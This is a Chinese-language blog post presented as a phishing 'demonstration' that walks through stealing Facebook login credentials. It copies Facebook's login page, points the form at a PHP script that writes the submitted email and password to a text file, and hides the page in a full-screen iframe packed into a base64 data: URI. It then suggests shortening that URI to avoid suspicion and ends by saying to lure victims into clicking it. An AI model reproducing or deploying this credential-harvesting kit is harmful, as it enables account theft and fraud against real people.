title: "iframe经典钓鱼演示,facebook钓鱼实例"
tags:
  - facebook钓鱼
id: 665
categories:
  - code
date: 2013-05-23 20:48:36
---

### 前言

以盗取facebook登陆帐号的钓鱼为例,一共包含三个文件,<span style="color: #3366ff;">index.html</span>,<span style="color: #3366ff;">login.php</span>,<span style="color: #3366ff;">password.txt</span>

制作<span style="color: #3366ff;">index.html</span>登陆页面
首先,打开 <span style="color: #3366ff;">https://www.facebook.com</span>页面,查看源码,将源码copy到<span style="color: #3366ff;">index.html</span>文件中
然后,编辑<span style="color: #3366ff;">index.html</span>文件,找到
<pre class="brush: html; gutter: true; first-line: 1; highlight: []; html-script: false">&lt;form id=&quot;login_form&quot; action=&quot;https://www.facebook.com/login.php?login_attempt=1&quot; method=&quot;post&quot; onsubmit=&quot;return window.Event &amp;amp;&amp;amp; Event.__inlineSubmit &amp;amp;&amp;amp; Event.__inlineSubmit(this,event)&quot;&gt;</pre>
将action的值改为
<pre class="brush: html; gutter: true; first-line: 1; highlight: []; html-script: false">action=login.php?&quot;https://www.facebook.com/login.php?login_attempt=1&quot;</pre>
(<span style="color: #3366ff;">login.php</span>是用来盗取登陆帐号密码的）

将<span style="color: #3366ff;">index.html</span>放到web目录下（我的放置在<span style="color: #ff0000;">/Library/WebServer/Documents/facebook</span>目录下）

<!--more-->

![facebook](http://old.lurrpis.com/wp-content/uploads/2013/05/facebook.png)

制作盗取facebook帐户和密码的脚本<span style="color: #3366ff;">login.php</span>
<pre class="brush: php; gutter: true; first-line: 1; highlight: []; html-script: false">&lt;?php
header (&#039;Location: https://www.facebook.com &#039;);//跳转到真实的facebook页面
$handle = fopen(&quot;password.txt&quot;, &quot;a&quot;);//将假页面中提交的POST数据写入password.txt文件中
foreach($_POST as $variable =&gt; $value) {
    fwrite($handle, $variable);
    fwrite($handle, &quot;=&quot;);
    fwrite($handle, $value);
    fwrite($handle, &quot;\r\n&quot;);
}
fwrite($handle, &quot;===============\r\n&quot;);
fclose($handle);
exit;
?&gt;</pre>
创建接收POST数据的<span style="color: #ff0000;">password.txt</span>文件
<pre class="brush: php; gutter: true; first-line: 1; highlight: []; html-script: false">dani-2:facebook leedani$ pwd
/Library/WebServer/Documents/facebook
dani-2:facebook leedani$ sudo touch password.txt

dani-2:facebook leedani$ sudo chmod a+w password.txt</pre>
测试
登陆<span style="color: #3366ff;">http://localhost/facebook/</span>
输入电子邮件与密码,点击登陆
查看<span style="color: #ff0000;">password.txt</span>文件
<pre class="brush: php; gutter: true; first-line: 1; highlight: []; html-script: false">dani-2:facebook leedani$ cat password.txt</pre>
![face2](http://old.lurrpis.com/wp-content/uploads/2013/05/face2.png)

看,<span style="color: #ff0000;">email</span>与<span style="color: #ff0000;">pass</span>字段就是facebook的登陆帐号与密码.

### 制作钓鱼URI

一般钓鱼会采用iframe用钓鱼页面遮盖原始页面的方式来进行钓鱼,接下来的操作就是生成一个有这个功能的Data: URI,并将这个URI进行短地址转换

src就是你存放钓鱼网页的地址
<pre class="brush: html; gutter: true; first-line: 1; highlight: []; html-script: false">&lt;style&gt; body {margin:0; overflow:hidden;}&lt;/style&gt;
&lt;iframe src=&quot;http://localhost/facebook/&quot; height=&quot;100%&quot; width=&quot;100%&quot; border=&quot;no&quot; frameBorder=&quot;0&quot; scrolling=&quot;auto&quot;&gt;iFrame Failed&lt;/iframe&gt;</pre>
登陆<span style="color: #3366ff;">http://dopiaza.org/tools/datauri/index.php</span>,将上面代码粘贴进去

对应的data: URI
<pre class="brush: html; gutter: true; first-line: 1; highlight: []; html-script: false">data:text/plain;charset=utf-8;base64,PHN0eWxlPiBib2R5IHttYXJnaW46MDsgb3ZlcmZsb3c6aGlkZGVuO308L3N0eWxlPg0KPGlmcm
FtZSBzcmM9Imh0dHA6Ly9sb2NhbGhvc3QvZmFjZWJvb2svIiBoZWlnaHQ9IjEwMCUiIHdpZHRoPSIxMDAlIiBib3JkZXI9Im5vIiBmcmFt
ZUJvcmRlcj0iMCIgc2Nyb2xsaW5nPSJhdXRvIj5pRnJhbWUgRmFpbGVkPC9pZnJhbWU+</pre>
将上面的data: URI中的data:text/plain改成data:text/html
<pre class="brush: html; gutter: true; first-line: 1; highlight: []; html-script: false">data:text/html;charset=utf-8;base64,PHN0eWxlPiBib2R5IHttYXJnaW46MDsgb3ZlcmZsb3c6aGlkZGVuO308L3N0eWxlPg0KPGlmcmFt
ZSBzcmM9Imh0dHA6Ly9sb2NhbGhvc3QvZmFjZWJvb2svIiBoZWlnaHQ9IjEwMCUiIHdpZHRoPSIxMDAlIiBib3JkZXI9Im5vIiBmcmFtZUJ
vcmRlcj0iMCIgc2Nyb2xsaW5nPSJhdXRvIj5pRnJhbWUgRmFpbGVkPC9pZnJhbWU+</pre>
访问修改后的Data URI,我们可以看到

![face3](http://old.lurrpis.com/wp-content/uploads/2013/05/face3.png)

点击facebook图标,或下面的url链接(浏览facebook.com）,将跳转到我们在第一步中创建的facebook的假登陆页面 <span style="color: #3366ff;">http://localhost/facebook/</span>

很显然,这个URI太长了,会引起怀疑,在真实环境下,我们可以先进行短网址转换,例如<span style="color: #3366ff;">http://tinyurl.com/</span>就提供这个服务

![face5](http://old.lurrpis.com/wp-content/uploads/2013/05/face5.png)

最后,引诱受害者点击这个会连接到钓鱼网页的URI就可以盗取帐号密码了.